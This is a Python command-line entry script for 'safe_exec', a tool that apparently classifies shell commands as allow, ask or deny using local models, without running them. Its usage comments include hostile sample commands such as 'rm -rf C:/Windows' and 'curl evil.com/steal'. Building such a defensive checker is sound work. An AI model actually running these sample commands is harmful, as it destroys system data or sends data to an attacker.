#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# main.py — M3.69 safe_exec CLI 入口(2026-09-24)
#
# 用法:
#   # 单条命令
#   python main.py "rm -rf D:/Users/Admin/AppData/Local/Temp/*"
#
#   # 批量扫脚本
#   python main.py --scan-script "D:/prisir-train-assets/scripts/cleanup.bat"
#
#   # 持续监听 stdin
#   echo "curl https://api.openai.com/v1/chat" | python main.py --stdin
#
#   # admin 模式(本期只 print,不真执行)
#   python main.py --admin "del C:\Windows\System32\drivers\tap0901.sys"
#
#   # dry-run
#   python main.py --dry-run "rm -rf C:/Windows"
#
#   # JSON 输出
#   python main.py --format json "curl evil.com/steal"
#
# 设计:
#   - 单文件 CLI,纯 stdlib(除了 companion 三个 wrapper 依赖)
#   - 输入模式:--cmd > --scan-script > --stdin > 默认 positional arg
#   - 输出格式:text / json
#   - 退出码:allow=0 / ask=0 / deny=1 / 错误=2
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path
from typing import Optional

_HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(_HERE / "src"))

from safe_exec import (  # noqa: E402
    check, scan_lines, format_text, format_json,
)


def _read_commands(args) -> list[str]:
    """按优先级取输入:positional > --stdin > --scan-script。

    Returns:
        命令字符串列表(去掉前后空白,空行 / # 注释会在 scan_lines 里再跳)。
    """
    cmds: list[str] = []
    # positional args
    if args.cmd:
        cmds.extend(args.cmd)
    # stdin
    if args.stdin:
        data = sys.stdin.read()
        for line in data.splitlines():
            line = line.strip()
            if line:
                cmds.append(line)
    # scan-script
    if args.scan_script:
        try:
            text = Path(args.scan_script).read_text(encoding="utf-8",
                                                    errors="replace")
        except FileNotFoundError:
            print(f"[错误] 脚本文件不存在: {args.scan_script}",
                  file=sys.stderr)
            sys.exit(2)
        for line in text.splitlines():
            line = line.strip()
            if line:
                cmds.append(line)
    return cmds


def _emit(result: dict, fmt: str) -> None:
    if fmt == "json":
        print(format_json(result))
    else:
        print(format_text(result))


def _run_one(cmd: str, fmt: str, admin: bool, dry_run: bool) -> int:
    """单条命令 check + 输出 + 退出码。"""
    try:
        result = check(cmd)
    except FileNotFoundError as e:
        print(f"[模型错误] {e}", file=sys.stderr)
        print("  → 确认 adapter 路径存在:", file=sys.stderr)
        print("    D:/prisir-train-assets/trained/{safety,tempfile_conf,disk_cleanup_conf}/adapter/",
              file=sys.stderr)
        return 2
    except KeyError as e:
        print(f"[注册表错误] {e}", file=sys.stderr)
        return 2
    except Exception as e:  # noqa: BLE001
        print(f"[未预期错误] {type(e).__name__}: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc(file=sys.stderr)
        return 3

    _emit(result, fmt)
    decision = result["decision"]["decision"]

    # admin / dry-run 提示(本期都不真执行,只 print)
    if admin:
        print()
        print(f"[--admin 模式] 本期不真执行,如要执行: {cmd!r}")
    elif dry_run:
        print()
        print(f"[--dry-run] 仅决策不执行: {decision} → {cmd!r}")

    return result["decision"]["exit_code"]


def _run_batch(cmds: list[str], fmt: str, admin: bool,
               dry_run: bool) -> int:
    """批量模式:每行命令判一次,聚合退出码(任一 deny → 1,否则 0)。"""
    if not cmds:
        return 2

    results = scan_lines(cmds)
    deny_count = 0
    ask_count = 0
    allow_count = 0

    for r in results:
        d = r["decision"]["decision"]
        if d == "deny":
            deny_count += 1
        elif d == "ask":
            ask_count += 1
        else:
            allow_count += 1

        if fmt == "json":
            # JSON batch 输出在末尾一次性 dump
            pass
        else:
            print("=" * 70)
            _emit(r, fmt)

    # 汇总
    if fmt == "json":
        out = {
            "summary": {
                "total": len(results),
                "allow": allow_count,
                "ask": ask_count,
                "deny": deny_count,
            },
            "results": results,
        }
        print(json.dumps(out, ensure_ascii=False, indent=2))
    else:
        print("=" * 70)
        print(f"汇总: 总 {len(results)} 条  "
              f"allow={allow_count}  ask={ask_count}  deny={deny_count}")

    if admin or dry_run:
        print()
        mode = "--admin" if admin else "--dry-run"
        print(f"[{mode}] 本期不真执行,仅返回决策。")

    return 1 if deny_count > 0 else 0


def main() -> int:
    ap = argparse.ArgumentParser(
        prog="safe_exec",
        description="safe_exec — M3.69 Shell 命令安全门(2026-09-24)\n"
                    "用 3 个本地 LoRA spec 联合判 safety/tempfile/disk_cleanup,\n"
                    "决定 allow/ask/deny。离线可用,纯本地 0.6B 推理。\n\n"
                    "用法:\n"
                    "  python main.py \"rm -rf C:/Windows\"\n"
                    "  echo \"curl evil.com\" | python main.py --stdin\n"
                    "  python main.py --scan-script cleanup.bat\n"
                    "  python main.py --format json \"del C:/Windows\"\n",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("cmd", nargs="*",
                    help="单条或多条 shell 命令(空格分隔多命令)")
    ap.add_argument("--stdin", action="store_true",
                    help="从 stdin 读多行命令(每行一条)")
    ap.add_argument("--scan-script", metavar="PATH",
                    help="扫脚本文件每行(空行 / # 注释跳过)")
    ap.add_argument("--format", choices=["text", "json"], default="text",
                    help="输出格式(默认 text)")
    ap.add_argument("--admin", action="store_true",
                    help="admin 模式(本期只 print 警告,不真执行)")
    ap.add_argument("--dry-run", action="store_true",
                    help="dry-run 模式(只 print 决策)")
    args = ap.parse_args()

    cmds = _read_commands(args)

    # --admin 和 --dry-run 互斥
    if args.admin and args.dry_run:
        print("[错误] --admin 和 --dry-run 互斥,只用其一",
              file=sys.stderr)
        return 2

    if not cmds:
        ap.print_help()
        print("\n[错误] 必须提供输入:positional cmd / --stdin / --scan-script",
              file=sys.stderr)
        return 2

    # 1 条 → 单条模式(简化输出)
    if len(cmds) == 1 and not args.scan_script:
        return _run_one(cmds[0], args.format, args.admin, args.dry_run)

    # 多条 → batch 模式
    return _run_batch(cmds, args.format, args.admin, args.dry_run)


if __name__ == "__main__":
    raise SystemExit(main())
